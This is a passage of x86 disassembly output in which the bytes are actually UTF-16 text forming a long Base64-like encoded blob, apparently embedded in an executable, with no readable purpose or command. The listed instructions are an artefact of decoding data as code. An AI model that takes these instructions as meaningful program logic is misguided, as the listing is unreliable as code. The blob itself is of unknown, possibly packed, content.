  409ae1:	00 61 00             	add    %ah,0x0(%ecx)
  409ae4:	36 00 37             	add    %dh,%ss:(%edi)
  409ae7:	00 6b 00             	add    %ch,0x0(%ebx)
  409aea:	2f                   	das
  409aeb:	00 52 00             	add    %dl,0x0(%edx)
  409aee:	58                   	pop    %eax
  409aef:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  409af3:	00 30                	add    %dh,(%eax)
  409af5:	00 37                	add    %dh,(%edi)
  409af7:	00 7a 00             	add    %bh,0x0(%edx)
  409afa:	70 00                	jo     0x409afc
  409afc:	4f                   	dec    %edi
  409afd:	00 66 00             	add    %ah,0x0(%esi)
  409b00:	6e                   	outsb  %ds:(%esi),(%dx)
  409b01:	00 6d 00             	add    %ch,0x0(%ebp)
  409b04:	57                   	push   %edi
  409b05:	00 70 00             	add    %dh,0x0(%eax)
  409b08:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  409b0c:	71 00                	jno    0x409b0e
  409b0e:	34 00                	xor    $0x0,%al
  409b10:	37                   	aaa
  409b11:	00 63 00             	add    %ah,0x0(%ebx)
  409b14:	77 00                	ja     0x409b16
  409b16:	6d                   	insl   (%dx),%es:(%edi)
  409b17:	00 6b 00             	add    %ch,0x0(%ebx)
  409b1a:	38 00                	cmp    %al,(%eax)
  409b1c:	35 00 41 00 63       	xor    $0x63004100,%eax
  409b21:	00 52 00             	add    %dl,0x0(%edx)
  409b24:	53                   	push   %ebx
  409b25:	00 55 00             	add    %dl,0x0(%ebp)
  409b28:	31 00                	xor    %eax,(%eax)
  409b2a:	6c                   	insb   (%dx),%es:(%edi)
  409b2b:	00 39                	add    %bh,(%ecx)
  409b2d:	00 65 00             	add    %ah,0x0(%ebp)
  409b30:	41                   	inc    %ecx
  409b31:	00 69 00             	add    %ch,0x0(%ecx)
  409b34:	46                   	inc    %esi
  409b35:	00 57 00             	add    %dl,0x0(%edi)
  409b38:	35 00 4a 00 6f       	xor    $0x6f004a00,%eax
  409b3d:	00 41 00             	add    %al,0x0(%ecx)
  409b40:	77 00                	ja     0x409b42
  409b42:	38 00                	cmp    %al,(%eax)
  409b44:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  409b48:	76 00                	jbe    0x409b4a
  409b4a:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  409b4e:	76 00                	jbe    0x409b50
  409b50:	30 00                	xor    %al,(%eax)
  409b52:	6e                   	outsb  %ds:(%esi),(%dx)
  409b53:	00 46 00             	add    %al,0x0(%esi)
  409b56:	6c                   	insb   (%dx),%es:(%edi)
  409b57:	00 6b 00             	add    %ch,0x0(%ebx)
  409b5a:	75 00                	jne    0x409b5c
  409b5c:	67 00 46 00          	add    %al,0x0(%bp)
  409b60:	34 00                	xor    $0x0,%al
  409b62:	61                   	popa
  409b63:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  409b67:	00 35 00 67 00 62    	add    %dh,0x62006700
  409b6d:	00 69 00             	add    %ch,0x0(%ecx)
  409b70:	45                   	inc    %ebp
  409b71:	00 2f                	add    %ch,(%edi)
  409b73:	00 33                	add    %dh,(%ebx)
  409b75:	00 58 00             	add    %bl,0x0(%eax)
  409b78:	5a                   	pop    %edx
  409b79:	00 35 00 64 00 52    	add    %dh,0x52006400
  409b7f:	00 4e 00             	add    %cl,0x0(%esi)
  409b82:	66 00 47 00          	data16 add %al,0x0(%edi)
  409b86:	4d                   	dec    %ebp
  409b87:	00 73 00             	add    %dh,0x0(%ebx)
  409b8a:	68 00 33 00 6c       	push   $0x6c003300
  409b8f:	00 56 00             	add    %dl,0x0(%esi)
  409b92:	4d                   	dec    %ebp
  409b93:	00 62 00             	add    %ah,0x0(%edx)
  409b96:	47                   	inc    %edi
  409b97:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  409b9b:	00 35 00 43 00 50    	add    %dh,0x50004300
  409ba1:	00 36                	add    %dh,(%esi)
  409ba3:	00 33                	add    %dh,(%ebx)
  409ba5:	00 66 00             	add    %ah,0x0(%esi)
  409ba8:	42                   	inc    %edx
  409ba9:	00 39                	add    %bh,(%ecx)
  409bab:	00 47 00             	add    %al,0x0(%edi)
  409bae:	74 00                	je     0x409bb0
  409bb0:	58                   	pop    %eax
  409bb1:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  409bb5:	00 4d 00             	add    %cl,0x0(%ebp)
  409bb8:	38 00                	cmp    %al,(%eax)
  409bba:	42                   	inc    %edx
  409bbb:	00 57 00             	add    %dl,0x0(%edi)
  409bbe:	65 00 64 00 4c       	add    %ah,%gs:0x4c(%eax,%eax,1)
  409bc3:	00 55 00             	add    %dl,0x0(%ebp)
  409bc6:	58                   	pop    %eax
  409bc7:	00 4a 00             	add    %cl,0x0(%edx)
  409bca:	59                   	pop    %ecx
  409bcb:	00 2b                	add    %ch,(%ebx)
  409bcd:	00 4a 00             	add    %cl,0x0(%edx)
  409bd0:	61                   	popa
  409bd1:	00 41 00             	add    %al,0x0(%ecx)
  409bd4:	34 00                	xor    $0x0,%al
  409bd6:	59                   	pop    %ecx
  409bd7:	00 66 00             	add    %ah,0x0(%esi)
  409bda:	69 00 75 00 56 00    	imul   $0x560075,(%eax),%eax
  409be0:	55                   	push   %ebp
  409be1:	00 6e 00             	add    %ch,0x0(%esi)
  409be4:	5a                   	pop    %edx
  409be5:	00 2f                	add    %ch,(%edi)
  409be7:	00 75 00             	add    %dh,0x0(%ebp)
  409bea:	75 00                	jne    0x409bec
  409bec:	63 00                	arpl   %eax,(%eax)
  409bee:	43                   	inc    %ebx
  409bef:	00 79 00             	add    %bh,0x0(%ecx)
  409bf2:	48                   	dec    %eax
  409bf3:	00 41 00             	add    %al,0x0(%ecx)
  409bf6:	78 00                	js     0x409bf8
  409bf8:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409bfb:	00 32                	add    %dh,(%edx)
  409bfd:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  409c01:	00 4e 00             	add    %cl,0x0(%esi)
  409c04:	7a 00                	jp     0x409c06
  409c06:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409c0a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c0b:	00 39                	add    %bh,(%ecx)
  409c0d:	00 6b 00             	add    %ch,0x0(%ebx)
  409c10:	39 00                	cmp    %eax,(%eax)
  409c12:	53                   	push   %ebx
  409c13:	00 51 00             	add    %dl,0x0(%ecx)
  409c16:	56                   	push   %esi
  409c17:	00 30                	add    %dh,(%eax)
  409c19:	00 78 00             	add    %bh,0x0(%eax)
  409c1c:	4a                   	dec    %edx
  409c1d:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  409c21:	00 67 00             	add    %ah,0x0(%edi)
  409c24:	50                   	push   %eax
  409c25:	00 4e 00             	add    %cl,0x0(%esi)
  409c28:	4e                   	dec    %esi
  409c29:	00 32                	add    %dh,(%edx)
  409c2b:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c2e:	63 00                	arpl   %eax,(%eax)
  409c30:	72 00                	jb     0x409c32
  409c32:	51                   	push   %ecx
  409c33:	00 77 00             	add    %dh,0x0(%edi)
  409c36:	34 00                	xor    $0x0,%al
  409c38:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  409c3c:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  409c40:	35 00 57 00 2f       	xor    $0x2f005700,%eax
  409c45:	00 30                	add    %dh,(%eax)
  409c47:	00 75 00             	add    %dh,0x0(%ebp)
  409c4a:	4a                   	dec    %edx
  409c4b:	00 38                	add    %bh,(%eax)
  409c4d:	00 6a 00             	add    %ch,0x0(%edx)
  409c50:	41                   	inc    %ecx
  409c51:	00 30                	add    %dh,(%eax)
  409c53:	00 57 00             	add    %dl,0x0(%edi)
  409c56:	33 00                	xor    (%eax),%eax
  409c58:	6d                   	insl   (%dx),%es:(%edi)
  409c59:	00 66 00             	add    %ah,0x0(%esi)
  409c5c:	56                   	push   %esi
  409c5d:	00 75 00             	add    %dh,0x0(%ebp)
  409c60:	4c                   	dec    %esp
  409c61:	00 77 00             	add    %dh,0x0(%edi)
  409c64:	4e                   	dec    %esi
  409c65:	00 55 00             	add    %dl,0x0(%ebp)
  409c68:	4d                   	dec    %ebp
  409c69:	00 43 00             	add    %al,0x0(%ebx)
  409c6c:	4e                   	dec    %esi
  409c6d:	00 70 00             	add    %dh,0x0(%eax)
  409c70:	74 00                	je     0x409c72
  409c72:	56                   	push   %esi
  409c73:	00 65 00             	add    %ah,0x0(%ebp)
  409c76:	58                   	pop    %eax
  409c77:	00 76 00             	add    %dh,0x0(%esi)
  409c7a:	73 00                	jae    0x409c7c
  409c7c:	4f                   	dec    %edi
  409c7d:	00 6f 00             	add    %ch,0x0(%edi)
  409c80:	37                   	aaa
  409c81:	00 45 00             	add    %al,0x0(%ebp)
  409c84:	4b                   	dec    %ebx
  409c85:	00 48 00             	add    %cl,0x0(%eax)
  409c88:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409c8c:	6a 00                	push   $0x0
  409c8e:	2b 00                	sub    (%eax),%eax
  409c90:	55                   	push   %ebp
  409c91:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409c95:	00 7a 00             	add    %bh,0x0(%edx)
  409c98:	61                   	popa
  409c99:	00 4a 00             	add    %cl,0x0(%edx)
  409c9c:	43                   	inc    %ebx
  409c9d:	00 55 00             	add    %dl,0x0(%ebp)
  409ca0:	4d                   	dec    %ebp
  409ca1:	00 76 00             	add    %dh,0x0(%esi)
  409ca4:	51                   	push   %ecx
  409ca5:	00 4b 00             	add    %cl,0x0(%ebx)
  409ca8:	49                   	dec    %ecx
  409ca9:	00 6e 00             	add    %ch,0x0(%esi)
  409cac:	61                   	popa
  409cad:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  409cb1:	00 4a 00             	add    %cl,0x0(%edx)
  409cb4:	41                   	inc    %ecx
  409cb5:	00 59 00             	add    %bl,0x0(%ecx)
  409cb8:	6c                   	insb   (%dx),%es:(%edi)
  409cb9:	00 4a 00             	add    %cl,0x0(%edx)
  409cbc:	41                   	inc    %ecx
  409cbd:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  409cc1:	00 4a 00             	add    %cl,0x0(%edx)
  409cc4:	71 00                	jno    0x409cc6
  409cc6:	5a                   	pop    %edx
  409cc7:	00 41 00             	add    %al,0x0(%ecx)
  409cca:	4b                   	dec    %ebx
  409ccb:	00 4b 00             	add    %cl,0x0(%ebx)
  409cce:	6a 00                	push   $0x0
  409cd0:	7a 00                	jp     0x409cd2
  409cd2:	6c                   	insb   (%dx),%es:(%edi)
  409cd3:	00 59 00             	add    %bl,0x0(%ecx)
  409cd6:	74 00                	je     0x409cd8
  409cd8:	70 00                	jo     0x409cda
  409cda:	73 00                	jae    0x409cdc
  409cdc:	33 00                	xor    (%eax),%eax
  409cde:	57                   	push   %edi
  409cdf:	00 67 00             	add    %ah,0x0(%edi)
  409ce2:	4a                   	dec    %edx
  409ce3:	00 47 00             	add    %al,0x0(%edi)
  409ce6:	4a                   	dec    %edx
  409ce7:	00 36                	add    %dh,(%esi)
  409ce9:	00 65 00             	add    %ah,0x0(%ebp)
  409cec:	7a 00                	jp     0x409cee
  409cee:	5a                   	pop    %edx
  409cef:	00 79 00             	add    %bh,0x0(%ecx)
  409cf2:	76 00                	jbe    0x409cf4
  409cf4:	35 00 66 00 6e       	xor    $0x6e006600,%eax
  409cf9:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  409cfd:	00 57 00             	add    %dl,0x0(%edi)
  409d00:	4c                   	dec    %esp
  409d01:	00 4f 00             	add    %cl,0x0(%edi)
  409d04:	4c                   	dec    %esp
  409d05:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  409d09:	00 73 00             	add    %dh,0x0(%ebx)
  409d0c:	6e                   	outsb  %ds:(%esi),(%dx)
  409d0d:	00 41 00             	add    %al,0x0(%ecx)
  409d10:	33 00                	xor    (%eax),%eax
  409d12:	31 00                	xor    %eax,(%eax)
  409d14:	67 00 67 00          	add    %ah,0x0(%bx)
  409d18:	35 00 33 00 6a       	xor    $0x6a003300,%eax
  409d1d:	00 5a 00             	add    %bl,0x0(%edx)
  409d20:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  409d24:	39 00                	cmp    %eax,(%eax)
  409d26:	62 00                	bound  %eax,(%eax)
  409d28:	6e                   	outsb  %ds:(%esi),(%dx)
  409d29:	00 79 00             	add    %bh,0x0(%ecx)
  409d2c:	55                   	push   %ebp
  409d2d:	00 39                	add    %bh,(%ecx)
  409d2f:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  409d33:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  409d37:	00 39                	add    %bh,(%ecx)
  409d39:	00 52 00             	add    %dl,0x0(%edx)
  409d3c:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  409d40:	57                   	push   %edi
  409d41:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d44:	4f                   	dec    %edi
  409d45:	00 43 00             	add    %al,0x0(%ebx)
  409d48:	64 00 36             	add    %dh,%fs:(%esi)
  409d4b:	00 73 00             	add    %dh,0x0(%ebx)
  409d4e:	41                   	inc    %ecx
  409d4f:	00 32                	add    %dh,(%edx)
  409d51:	00 4d 00             	add    %cl,0x0(%ebp)
  409d54:	62 00                	bound  %eax,(%eax)
  409d56:	56                   	push   %esi
  409d57:	00 70 00             	add    %dh,0x0(%eax)
  409d5a:	56                   	push   %esi
  409d5b:	00 75 00             	add    %dh,0x0(%ebp)
  409d5e:	59                   	pop    %ecx
  409d5f:	00 65 00             	add    %ah,0x0(%ebp)
  409d62:	30 00                	xor    %al,(%eax)
  409d64:	5a                   	pop    %edx
  409d65:	00 2b                	add    %ch,(%ebx)
  409d67:	00 51 00             	add    %dl,0x0(%ecx)
  409d6a:	32 00                	xor    (%eax),%al
  409d6c:	70 00                	jo     0x409d6e
  409d6e:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409d72:	4e                   	dec    %esi
  409d73:	00 55 00             	add    %dl,0x0(%ebp)
  409d76:	6b 00 30             	imul   $0x30,(%eax),%eax
  409d79:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  409d7d:	00 78 00             	add    %bh,0x0(%eax)
  409d80:	34 00                	xor    $0x0,%al
  409d82:	69 00 75 00 43 00    	imul   $0x430075,(%eax),%eax
  409d88:	2b 00                	sub    (%eax),%eax
  409d8a:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  409d8e:	54                   	push   %esp
  409d8f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d92:	65 00 2f             	add    %ch,%gs:(%edi)
  409d95:	00 4b 00             	add    %cl,0x0(%ebx)
  409d98:	59                   	pop    %ecx
  409d99:	00 2b                	add    %ch,(%ebx)
  409d9b:	00 5a 00             	add    %bl,0x0(%edx)
  409d9e:	31 00                	xor    %eax,(%eax)
  409da0:	4c                   	dec    %esp
  409da1:	00 30                	add    %dh,(%eax)
  409da3:	00 6b 00             	add    %ch,0x0(%ebx)
  409da6:	39 00                	cmp    %eax,(%eax)
  409da8:	55                   	push   %ebp
  409da9:	00 50 00             	add    %dl,0x0(%eax)
  409dac:	77 00                	ja     0x409dae
  409dae:	31 00                	xor    %eax,(%eax)
  409db0:	31 00                	xor    %eax,(%eax)
  409db2:	2b 00                	sub    (%eax),%eax
  409db4:	31 00                	xor    %eax,(%eax)
  409db6:	6e                   	outsb  %ds:(%esi),(%dx)
  409db7:	00 61 00             	add    %ah,0x0(%ecx)
  409dba:	4b                   	dec    %ebx
  409dbb:	00 78 00             	add    %bh,0x0(%eax)
  409dbe:	4a                   	dec    %edx
  409dbf:	00 46 00             	add    %al,0x0(%esi)
  409dc2:	54                   	push   %esp
  409dc3:	00 68 00             	add    %ch,0x0(%eax)
  409dc6:	4c                   	dec    %esp
  409dc7:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409dcb:	00 48 00             	add    %cl,0x0(%eax)
  409dce:	39 00                	cmp    %eax,(%eax)
  409dd0:	74 00                	je     0x409dd2
  409dd2:	43                   	inc    %ebx
  409dd3:	00 2f                	add    %ch,(%edi)
  409dd5:	00 4d 00             	add    %cl,0x0(%ebp)
  409dd8:	68 00 74 00 54       	push   $0x54007400
  409ddd:	00 43 00             	add    %al,0x0(%ebx)
  409de0:	34 00                	xor    $0x0,%al
  409de2:	4d                   	dec    %ebp
  409de3:	00 37                	add    %dh,(%edi)
  409de5:	00 4b 00             	add    %cl,0x0(%ebx)
  409de8:	68 00 56 00 34       	push   $0x34005600
  409ded:	00 33                	add    %dh,(%ebx)
  409def:	00 46 00             	add    %al,0x0(%esi)
  409df2:	4e                   	dec    %esi
  409df3:	00 76 00             	add    %dh,0x0(%esi)
  409df6:	31 00                	xor    %eax,(%eax)
  409df8:	46                   	inc    %esi
  409df9:	00 79 00             	add    %bh,0x0(%ecx)
  409dfc:	76 00                	jbe    0x409dfe
  409dfe:	54                   	push   %esp
  409dff:	00 4d 00             	add    %cl,0x0(%ebp)
  409e02:	6b 00 46             	imul   $0x46,(%eax),%eax
  409e05:	00 2b                	add    %ch,(%ebx)
  409e07:	00 49 00             	add    %cl,0x0(%ecx)
  409e0a:	67 00 31             	add    %dh,(%bx,%di)
  409e0d:	00 32                	add    %dh,(%edx)
  409e0f:	00 45 00             	add    %al,0x0(%ebp)
  409e12:	56                   	push   %esi
  409e13:	00 43 00             	add    %al,0x0(%ebx)
  409e16:	67 00 56 00          	add    %dl,0x0(%bp)
  409e1a:	58                   	pop    %eax
  409e1b:	00 78 00             	add    %bh,0x0(%eax)
  409e1e:	4d                   	dec    %ebp
  409e1f:	00 43 00             	add    %al,0x0(%ebx)
  409e22:	33 00                	xor    (%eax),%eax
  409e24:	6e                   	outsb  %ds:(%esi),(%dx)
  409e25:	00 58 00             	add    %bl,0x0(%eax)
  409e28:	53                   	push   %ebx
  409e29:	00 37                	add    %dh,(%edi)
  409e2b:	00 79 00             	add    %bh,0x0(%ecx)
  409e2e:	77 00                	ja     0x409e30
  409e30:	6d                   	insl   (%dx),%es:(%edi)
  409e31:	00 7a 00             	add    %bh,0x0(%edx)
  409e34:	48                   	dec    %eax
  409e35:	00 52 00             	add    %dl,0x0(%edx)
  409e38:	73 00                	jae    0x409e3a
  409e3a:	79 00                	jns    0x409e3c
  409e3c:	79 00                	jns    0x409e3e
  409e3e:	49                   	dec    %ecx
  409e3f:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  409e43:	00 5a 00             	add    %bl,0x0(%edx)
  409e46:	78 00                	js     0x409e48
  409e48:	58                   	pop    %eax
  409e49:	00 52 00             	add    %dl,0x0(%edx)
  409e4c:	77 00                	ja     0x409e4e
  409e4e:	33 00                	xor    (%eax),%eax
  409e50:	55                   	push   %ebp
  409e51:	00 75 00             	add    %dh,0x0(%ebp)
  409e54:	52                   	push   %edx
  409e55:	00 35 00 7a 00 35    	add    %dh,0x35007a00
  409e5b:	00 50 00             	add    %dl,0x0(%eax)
  409e5e:	5a                   	pop    %edx
  409e5f:	00 4f 00             	add    %cl,0x0(%edi)
  409e62:	2b 00                	sub    (%eax),%eax
  409e64:	31 00                	xor    %eax,(%eax)
  409e66:	4b                   	dec    %ebx
  409e67:	00 51 00             	add    %dl,0x0(%ecx)
  409e6a:	55                   	push   %ebp
  409e6b:	00 48 00             	add    %cl,0x0(%eax)
  409e6e:	77 00                	ja     0x409e70
  409e70:	69 00 77 00 48 00    	imul   $0x480077,(%eax),%eax
  409e76:	72 00                	jb     0x409e78
  409e78:	53                   	push   %ebx
  409e79:	00 6f 00             	add    %ch,0x0(%edi)
  409e7c:	64 00 33             	add    %dh,%fs:(%ebx)
  409e7f:	00 76 00             	add    %dh,0x0(%esi)
  409e82:	45                   	inc    %ebp
  409e83:	00 4b 00             	add    %cl,0x0(%ebx)
  409e86:	4b                   	dec    %ebx
  409e87:	00 37                	add    %dh,(%edi)
  409e89:	00 45 00             	add    %al,0x0(%ebp)
  409e8c:	7a 00                	jp     0x409e8e
  409e8e:	6d                   	insl   (%dx),%es:(%edi)
  409e8f:	00 56 00             	add    %dl,0x0(%esi)
  409e92:	2f                   	das
  409e93:	00 75 00             	add    %dh,0x0(%ebp)
  409e96:	4a                   	dec    %edx
  409e97:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e9a:	53                   	push   %ebx
  409e9b:	00 47 00             	add    %al,0x0(%edi)
  409e9e:	56                   	push   %esi
  409e9f:	00 7a 00             	add    %bh,0x0(%edx)
  409ea2:	52                   	push   %edx
  409ea3:	00 2f                	add    %ch,(%edi)
  409ea5:	00 62 00             	add    %ah,0x0(%edx)
  409ea8:	50                   	push   %eax
  409ea9:	00 77 00             	add    %dh,0x0(%edi)
  409eac:	4c                   	dec    %esp
  409ead:	00 6d 00             	add    %ch,0x0(%ebp)
  409eb0:	72 00                	jb     0x409eb2
  409eb2:	76 00                	jbe    0x409eb4
  409eb4:	45                   	inc    %ebp
  409eb5:	00 42 00             	add    %al,0x0(%edx)
  409eb8:	2b 00                	sub    (%eax),%eax
  409eba:	71 00                	jno    0x409ebc
  409ebc:	43                   	inc    %ebx
  409ebd:	00 59 00             	add    %bl,0x0(%ecx)
  409ec0:	54                   	push   %esp
  409ec1:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  409ec5:	00 77 00             	add    %dh,0x0(%edi)
  409ec8:	2f                   	das
  409ec9:	00 6e 00             	add    %ch,0x0(%esi)
  409ecc:	4b                   	dec    %ebx
  409ecd:	00 32                	add    %dh,(%edx)
  409ecf:	00 6b 00             	add    %ch,0x0(%ebx)
  409ed2:	31 00                	xor    %eax,(%eax)
  409ed4:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  409ed8:	2b 00                	sub    (%eax),%eax
  409eda:	7a 00                	jp     0x409edc
  409edc:	2f                   	das
  409edd:	00 72 00             	add    %dh,0x0(%edx)
  409ee0:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  409ee4:	4e                   	dec    %esi
  409ee5:	00 38                	add    %bh,(%eax)
  409ee7:	00 6d 00             	add    %ch,0x0(%ebp)
  409eea:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409eee:	78 00                	js     0x409ef0
  409ef0:	59                   	pop    %ecx
  409ef1:	00 48 00             	add    %cl,0x0(%eax)
  409ef4:	48                   	dec    %eax
  409ef5:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  409ef9:	00 33                	add    %dh,(%ebx)
  409efb:	00 55 00             	add    %dl,0x0(%ebp)
  409efe:	46                   	inc    %esi
  409eff:	00 39                	add    %bh,(%ecx)
  409f01:	00 43 00             	add    %al,0x0(%ebx)
  409f04:	76 00                	jbe    0x409f06
  409f06:	54                   	push   %esp
  409f07:	00 47 00             	add    %al,0x0(%edi)
  409f0a:	68 00 67 00 51       	push   $0x51006700
  409f0f:	00 47 00             	add    %al,0x0(%edi)
  409f12:	73 00                	jae    0x409f14
  409f14:	51                   	push   %ecx
  409f15:	00 77 00             	add    %dh,0x0(%edi)
  409f18:	77 00                	ja     0x409f1a
  409f1a:	44                   	inc    %esp
  409f1b:	00 71 00             	add    %dh,0x0(%ecx)
  409f1e:	50                   	push   %eax
  409f1f:	00 68 00             	add    %ch,0x0(%eax)
  409f22:	37                   	aaa
  409f23:	00 4d 00             	add    %cl,0x0(%ebp)
  409f26:	77 00                	ja     0x409f28
  409f28:	78 00                	js     0x409f2a
  409f2a:	49                   	dec    %ecx
  409f2b:	00 53 00             	add    %dl,0x0(%ebx)
  409f2e:	35 00 4a 00 39       	xor    $0x39004a00,%eax
  409f33:	00 41 00             	add    %al,0x0(%ecx)
  409f36:	44                   	inc    %esp
  409f37:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  409f3b:	00 63 00             	add    %ah,0x0(%ebx)
  409f3e:	35 00 55 00 53       	xor    $0x53005500,%eax
  409f43:	00 72 00             	add    %dh,0x0(%edx)
  409f46:	77 00                	ja     0x409f48
  409f48:	50                   	push   %eax
  409f49:	00 45 00             	add    %al,0x0(%ebp)
  409f4c:	34 00                	xor    $0x0,%al
  409f4e:	52                   	push   %edx
  409f4f:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  409f53:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  409f57:	00 42 00             	add    %al,0x0(%edx)
  409f5a:	6b 00 52             	imul   $0x52,(%eax),%eax
  409f5d:	00 35 00 49 00 6d    	add    %dh,0x6d004900
  409f63:	00 42 00             	add    %al,0x0(%edx)
  409f66:	59                   	pop    %ecx
  409f67:	00 36                	add    %dh,(%esi)
  409f69:	00 2f                	add    %ch,(%edi)
  409f6b:	00 66 00             	add    %ah,0x0(%esi)
  409f6e:	77 00                	ja     0x409f70
  409f70:	33 00                	xor    (%eax),%eax
  409f72:	43                   	inc    %ebx
  409f73:	00 6f 00             	add    %ch,0x0(%edi)
  409f76:	37                   	aaa
  409f77:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  409f7b:	00 7a 00             	add    %bh,0x0(%edx)
  409f7e:	45                   	inc    %ebp
  409f7f:	00 6e 00             	add    %ch,0x0(%esi)
  409f82:	2f                   	das
  409f83:	00 67 00             	add    %ah,0x0(%edi)
  409f86:	37                   	aaa
  409f87:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409f8b:	00 2b                	add    %ch,(%ebx)
  409f8d:	00 65 00             	add    %ah,0x0(%ebp)
  409f90:	56                   	push   %esi
  409f91:	00 52 00             	add    %dl,0x0(%edx)
  409f94:	78 00                	js     0x409f96
  409f96:	64 00 37             	add    %dh,%fs:(%edi)
  409f99:	00 30                	add    %dh,(%eax)
  409f9b:	00 4e 00             	add    %cl,0x0(%esi)
  409f9e:	5a                   	pop    %edx
  409f9f:	00 75 00             	add    %dh,0x0(%ebp)
  409fa2:	50                   	push   %eax
  409fa3:	00 41 00             	add    %al,0x0(%ecx)
  409fa6:	63 00                	arpl   %eax,(%eax)
  409fa8:	39 00                	cmp    %eax,(%eax)
  409faa:	36 00 6c 00 55       	add    %ch,%ss:0x55(%eax,%eax,1)
  409faf:	00 4d 00             	add    %cl,0x0(%ebp)
  409fb2:	4c                   	dec    %esp
  409fb3:	00 61 00             	add    %ah,0x0(%ecx)
  409fb6:	6c                   	insb   (%dx),%es:(%edi)
  409fb7:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fba:	49                   	dec    %ecx
  409fbb:	00 53 00             	add    %dl,0x0(%ebx)
  409fbe:	38 00                	cmp    %al,(%eax)
  409fc0:	6b 00 56             	imul   $0x56,(%eax),%eax
  409fc3:	00 7a 00             	add    %bh,0x0(%edx)
  409fc6:	78 00                	js     0x409fc8
  409fc8:	72 00                	jb     0x409fca
  409fca:	79 00                	jns    0x409fcc
  409fcc:	4b                   	dec    %ebx
  409fcd:	00 43 00             	add    %al,0x0(%ebx)
  409fd0:	71 00                	jno    0x409fd2
  409fd2:	76 00                	jbe    0x409fd4
  409fd4:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  409fd8:	74 00                	je     0x409fda
  409fda:	61                   	popa
  409fdb:	00 6a 00             	add    %ch,0x0(%edx)
  409fde:	54                   	push   %esp
  409fdf:	00 46 00             	add    %al,0x0(%esi)
  409fe2:	30 00                	xor    %al,(%eax)
  409fe4:	32 00                	xor    (%eax),%al
  409fe6:	48                   	dec    %eax
  409fe7:	00 51 00             	add    %dl,0x0(%ecx)
  409fea:	38 00                	cmp    %al,(%eax)
  409fec:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409ff0:	75 00                	jne    0x409ff2
  409ff2:	2b 00                	sub    (%eax),%eax
  409ff4:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  409ff8:	2f                   	das
  409ff9:	00 73 00             	add    %dh,0x0(%ebx)
  409ffc:	4c                   	dec    %esp
  409ffd:	00 62 00             	add    %ah,0x0(%edx)
  40a000:	4d                   	dec    %ebp
  40a001:	00 4b 00             	add    %cl,0x0(%ebx)
  40a004:	53                   	push   %ebx
  40a005:	00 37                	add    %dh,(%edi)
  40a007:	00 50 00             	add    %dl,0x0(%eax)
  40a00a:	55                   	push   %ebp
  40a00b:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a00f:	00 66 00             	add    %ah,0x0(%esi)
  40a012:	59                   	pop    %ecx
  40a013:	00 4d 00             	add    %cl,0x0(%ebp)
  40a016:	46                   	inc    %esi
  40a017:	00 56 00             	add    %dl,0x0(%esi)
  40a01a:	2f                   	das
  40a01b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a01e:	79 00                	jns    0x40a020
  40a020:	63 00                	arpl   %eax,(%eax)
  40a022:	62 00                	bound  %eax,(%eax)
  40a024:	71 00                	jno    0x40a026
  40a026:	4c                   	dec    %esp
  40a027:	00 75 00             	add    %dh,0x0(%ebp)
  40a02a:	54                   	push   %esp
  40a02b:	00 77 00             	add    %dh,0x0(%edi)
  40a02e:	72 00                	jb     0x40a030
  40a030:	51                   	push   %ecx
  40a031:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40a035:	00 76 00             	add    %dh,0x0(%esi)
  40a038:	43                   	inc    %ebx
  40a039:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40a03d:	00 61 00             	add    %ah,0x0(%ecx)
  40a040:	32 00                	xor    (%eax),%al
  40a042:	71 00                	jno    0x40a044
  40a044:	32 00                	xor    (%eax),%al
  40a046:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40a04a:	73 00                	jae    0x40a04c
  40a04c:	32 00                	xor    (%eax),%al
  40a04e:	50                   	push   %eax
